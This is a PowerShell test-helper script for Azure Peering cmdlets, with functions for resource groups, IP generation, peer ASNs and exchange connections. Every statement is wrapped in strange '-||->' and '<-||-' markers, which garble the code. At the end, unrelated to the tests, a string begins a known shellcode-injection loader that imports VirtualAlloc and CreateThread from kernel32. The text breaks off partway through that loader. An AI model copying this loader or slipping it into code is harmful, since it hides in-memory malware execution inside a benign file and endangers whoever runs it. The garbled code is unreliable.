














 -||-> $dll =  -||-> dir | Where-Object { -||-> $_.Name -match "Peering.Test.dll" <-||- } | % { -||-> $_.FullName <-||- } <-||-  <-||- ;
 -||-> [Reflection.Assembly]::LoadFile($dll) <-||- ;
 -||-> $ipGenerator =  -||-> New-Object Microsoft.Azure.Commands.Peering.Test.ScenarioTests.IPGenerator <-||-  <-||- ;


 -||-> function TestSetup-CreateResourceGroup
{
     -||-> $resourceGroupName =  -||-> getAssetName "MockRg" <-||-  <-||- 
	 -||-> Write-Debug "ResourceGroupName: $resourceGroupName" <-||- 
     -||-> $rglocation = "Central US" <-||- 
     -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $resourceGroupName -location $rglocation -Force <-||-  <-||- 
	 -||-> Write-Debug "Created $resourceGroupName" <-||- 
    return  -||-> $resourceGroup <-||- 
} <-||- 

 -||-> function getPeeringLocation ($kind, $location)
{
	return  -||-> Get-AzPeeringLocation -Kind $kind -PeeringLocation $location <-||- 
} <-||- 

 -||-> function isDirect ($t)
{
	 -||-> if ( -||-> $t -eq $true <-||- ){
		return  -||-> "Direct" <-||- 
	} <-||- 
	return  -||-> "Exchange" <-||- 
} <-||- 

 -||-> function newIpV4Address ($withPrefix, $maxPrefix, $offset, $randomNum)
{
		 -||-> $ipv4 = $ipGenerator.CreateIpv4Address($randomNum, $maxPrefix) <-||- ;
		return  -||-> $ipGenerator.OffSet($ipv4, $false, $offset, $withPrefix) <-||- ;
} <-||- 

 -||-> function newIpV6Address ($withPrefix, $maxPrefix, $offset, $randomNum)
{
		 -||-> $ipv6 = $ipGenerator.CreateIpv6Address($randomNum, $maxPrefix) <-||- ;
		return  -||-> $ipGenerator.OffSet($ipv6, $true, $offset, $withPrefix) <-||- ;
} <-||- 

 -||-> function changeIp($address, $isv6, $offset, $withPrefix){
return  -||-> $ipGenerator.OffSet($address, $isv6, $offset, $withPrefix) <-||- ;
} <-||- 

 -||-> function maxAdvertisedIpv4
{
	 -||-> $maxPrefixV4 =  -||-> getPeeringVariable "MaxPrefixV4" $ipGenerator.BuildMaxPrefixes($false) <-||-  <-||- ;
	return  -||-> $maxPrefixV4 <-||- 
} <-||- 

 -||-> function maxAdvertisedIpv6
{
	 -||-> $maxPrefixV6 =  -||-> getPeeringVariable "MaxPrefixV6" $ipGenerator.BuildMaxPrefixes($true) <-||-  <-||- ;
	return  -||-> $maxPrefixV6 <-||- 
} <-||- 

 -||-> function getHash
{
 -||-> $hash =  -||-> getPeeringVariable "Hash" $ipGenerator.BuildHash() <-||-  <-||- 
 -||-> Write-Debug "The hash $hash" <-||- ;
return  -||-> "$hash" <-||- 
} <-||- 

 -||-> function getBandwidth
{
 -||-> $bandwidth =  -||-> getPeeringVariable "bandwidth" $ipGenerator.GetBandwidth() <-||-  <-||- 
 -||-> Write-Debug "The bandwidth $bandwidth" <-||- ;
	return  -||-> $bandwidth <-||- 
} <-||- 

 -||-> function getRandomNumber {
	 -||-> $num =  -||-> Get-Random -Maximum 65010 -Minimum 1 <-||-  <-||- 
	 -||-> Write-Debug "The random $num" <-||- ;
	return  -||-> $num <-||- 
} <-||- 

 -||-> function makePeerAsn($asn)
{
	 -||-> $asnId = $asn <-||- 
	 -||-> $asnPeerName =  -||-> getAssetName "$asn-Global" <-||-  <-||- 
	 -||-> Write-Debug "PeerName $asnPeerName" <-||- 
	 -||-> $asnPeer =  -||-> getAssetName "AS$asn-Global" <-||-  <-||- 
	 -||-> Write-Debug "PeerName $asnPeer" <-||-  
	 -||-> [string[]]$emails = "noc@$asnPeer.com","noc@$asnPeerName.com" <-||- 
	 -||-> $phone =  -||-> getAssetName "2342432433" <-||-  <-||- 
	 -||-> Write-Debug "Email: $emails; Phone $phone" <-||-  
	 -||-> $created =  -||-> New-AzPeerAsn -Name $asnPeerName -PeerName $asnPeer -PeerAsn $asnId -Email $emails -Phone $phone <-||-  <-||- 
	 -||-> Write-Debug "PeerName $asnPeerName" <-||- 
	 -||-> $created.ValidationState = "Approved" <-||- ;
	 -||-> Write-Debug "ValidationState: $created" <-||-  
	 -||-> Write-Debug "Sleep 2 seconds..." <-||-  
	 -||-> Wait-Seconds 2 <-||- 
	 -||-> $created =  -||-> $created | Set-AzPeerAsn <-||-  <-||- 
	return  -||-> $created <-||- 
} <-||- 

 -||-> function removePeerAsn($asn){
	 -||-> $asn | Remove-AzPeerAsn -Force <-||- 
} <-||- 

 -||-> function NewExchangeConnectionV4V6($facilityId, $v4, $v6)
{
	
	 -||-> Write-Debug "Creating Connection at $facilityId" <-||- 
	 -||-> $md5 =  -||-> getHash <-||-  <-||- 
	 -||-> $md5 = $md5.ToString() <-||- 
	 -||-> Write-Debug "Created Hash $md5" <-||- 
	 -||-> $offset =  -||-> Get-Random -Maximum 20 -Minimum 3 <-||-  <-||- 
	 -||-> $sessionv4 =  -||-> changeIp "$v4/32" $false $offset $false <-||-  <-||- 
	 -||-> $sessionv6 =  -||-> changeIp "$v6/128" $true $offset $false <-||-  <-||- 
	 -||-> Write-Debug "Created IPs $sessionv4" <-||- 
	 -||-> $maxv4 =  -||-> maxAdvertisedIpv4 <-||-  <-||- 
	 -||-> $maxv6 =  -||-> maxAdvertisedIpv6 <-||-  <-||- 
	 -||-> Write-Debug "Created maxAdvertised $maxv4 $maxv6" <-||- 
	
     -||-> $createdConnection =  -||-> New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv4 $maxv4 -PeerSessionIPv4Address $sessionv4 -PeerSessionIPv6Address $sessionv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -MD5AuthenticationKey $md5 <-||-  <-||- 
	return  -||-> $createdConnection <-||- 
} <-||- 

 -||-> function getPeeringVariable
{
   param([string]$variableName, $value)
    -||-> $testName =  -||-> getTestName <-||-  <-||- 
    -||-> if ( -||-> $value <-||- )
   {
    -||-> $result = $value <-||- 
   }
   else {
    -||-> $reult = $null <-||- 
   } <-||- 
   -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables.ContainsKey($variableName) <-||- )
  {
       -||-> $result = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] <-||- 
  } <-||- 
   -||-> if ( -||-> ![Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables.ContainsKey($variableName) <-||- ){
   return  -||-> $result = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::GetVariable($variableName, $value) <-||- 
  } <-||- 

  return  -||-> $result <-||- 
} <-||- 


 -||-> function Assert-Tags($tags1, $tags2)
{
     -||-> if( -||-> $tags1.count -ne $tags2.count <-||- )
    {
        throw  -||-> "Tag size not equal. Tag1: $tags1.count Tag2: $tags2.count" <-||- 
    } <-||- 

     -||-> foreach($key in  -||-> $tags1.Keys <-||- )
    {
         -||-> if( -||-> $tags1[$key] -ne $tags2[$key] <-||- )
        {
            throw  -||-> "Tag content not equal. Key:$key Tags1:" +  $tags1[$key] + "Tags2:" + $tags2[$key] <-||- 
        } <-||- 
    } <-||- 
} <-||- 


 -||-> function Clean-ResourceGroup($rgname)
{
	 -||-> $assemblies =  -||-> [AppDomain]::Currentdomain.GetAssemblies() | Select-Object FullName | ForEach-Object {  -||-> $_.FullName.Substring(0, $_.FullName.IndexOf(',')) <-||-  } <-||-  <-||- 
     -||-> if ( -||-> $assemblies -notcontains 'Microsoft.Azure.Test.HttpRecorder.HttpMockServer' `
		-or $assemblies -notcontains 'Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode' `
		-or [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback <-||- ) {
         -||-> Remove-AzResourceGroup -Name $rgname -Force <-||- 
    } <-||- 
} <-||- 
 -||-> $1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]p


 <-||- 
